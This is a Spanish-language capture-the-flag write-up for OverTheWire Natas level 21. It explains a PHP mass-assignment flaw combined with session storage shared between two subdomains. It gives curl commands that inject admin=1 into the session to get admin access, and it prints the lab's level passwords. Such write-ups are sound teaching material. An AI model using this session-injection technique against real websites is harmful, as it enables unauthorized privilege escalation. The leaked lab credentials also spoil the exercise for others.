# Natas 21 → 22

## Información del nivel

| Campo | Valor |
|---|---|
| URL principal | http://natas21.natas.labs.overthewire.org |
| URL experimenter | http://natas21-experimenter.natas.labs.overthewire.org |
| Usuario | natas21 |
| Contraseña | BPhv63cKE1lkQl04cE5CuFTzXe15NfiH |
| Contraseña obtenida | d8rwGBl0Xslg3b76uh3fEbSlnOUBlozz |

---

## Reconocimiento

El nivel presenta dos URLs colocadas en el mismo servidor. La URL principal muestra:

```
You are logged in as a regular user. Login as an admin to retrieve credentials for natas22.
```

La URL experimenter permite modificar estilos CSS mediante un formulario.

---

## Análisis del código fuente

### URL principal

```php
session_start();
if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {
    print "Password: <censored>";
}
```

Igual que natas20 — necesitamos que `$_SESSION["admin"] == 1`.

### URL experimenter

```php
session_start();
if(array_key_exists("submit", $_REQUEST)) {
    foreach($_REQUEST as $key => $val) {
        $_SESSION[$key] = $val;
    }
}
```

**Aquí está la vulnerabilidad.** Si el request contiene `submit`, guarda **todo** lo que venga en el request directamente en `$_SESSION` sin filtrar. No valida qué claves se están guardando — acepta cualquier clave, incluyendo `admin`.

El formulario solo muestra `align`, `fontsize` y `bgcolor`, pero el código no restringe a esas claves.

---

## Vulnerabilidad: Mass Assignment + Session Sharing

**Mass Assignment** — el código asigna directamente todos los parámetros del request a la sesión sin filtrar. Un atacante puede inyectar cualquier clave-valor, incluyendo `admin=1`.

**Session Sharing** — los dos dominios comparten el mismo almacenamiento de sesiones en disco (`/var/lib/php/sessions/`). Esto significa que el mismo `PHPSESSID` funciona en ambos dominios — apuntan al mismo archivo en el servidor.

---

## ¿Qué es PHPSESSID?

Es la cookie que PHP usa para identificar la sesión de un usuario. Cuando el servidor crea una sesión, genera un ID único y lo envía al navegador como cookie. En cada request siguiente, el navegador envía ese ID y el servidor recupera la sesión asociada.

Si dos aplicaciones comparten el mismo almacenamiento de sesiones, el mismo PHPSESSID funciona en ambas.

---

## Métodos HTTP: GET vs POST

| Método | Cómo se envían los datos | Uso típico |
|---|---|---|
| GET | En la URL: `?clave=valor` | Obtener información |
| POST | En el cuerpo del request | Enviar/modificar datos |

En curl:
- GET: simplemente la URL con `?parámetros`
- POST: `-X POST -d "parámetros"`

---

## Explotación

El flujo en tres pasos:

```bash
# Paso 1: Crear sesión en natas21 y obtener PHPSESSID
curl -s -c cookies21.txt "http://natas21.natas.labs.overthewire.org/" \
  -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH > /dev/null

# Ver el PHPSESSID obtenido
cat cookies21.txt
```

```bash
# Paso 2: Usar ese PHPSESSID para inyectar admin=1 en el experimenter
curl -s -b "PHPSESSID=<id_obtenido>" -X POST -d "admin=1&submit=1" \
  "http://natas21-experimenter.natas.labs.overthewire.org/" \
  -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH > /dev/null
```

```bash
# Paso 3: Acceder a natas21 con la sesión modificada
curl -s -b "PHPSESSID=<id_obtenido>" \
  "http://natas21.natas.labs.overthewire.org/" \
  -u natas21:BPhv63cKE1lkQl04cE5CuFTzXe15NfiH | grep -i password
```

**¿Por qué crear la sesión en natas21 primero?**
El archivo de sesión debe existir en el almacenamiento compartido antes de que el experimenter pueda escribir en él. Si se empieza en el experimenter, el archivo queda en su propio almacenamiento y natas21 no lo encuentra.

---

## Conceptos clave

- **Mass Assignment**: asignar directamente parámetros externos a objetos internos sin validar. Vulnerabilidad común en frameworks web.
- **Session Sharing**: dos aplicaciones en el mismo servidor pueden compartir sesiones si usan el mismo almacenamiento.
- **PHPSESSID**: identificador de sesión PHP transmitido como cookie.
- **GET vs POST**: GET envía datos en la URL, POST en el cuerpo del request.
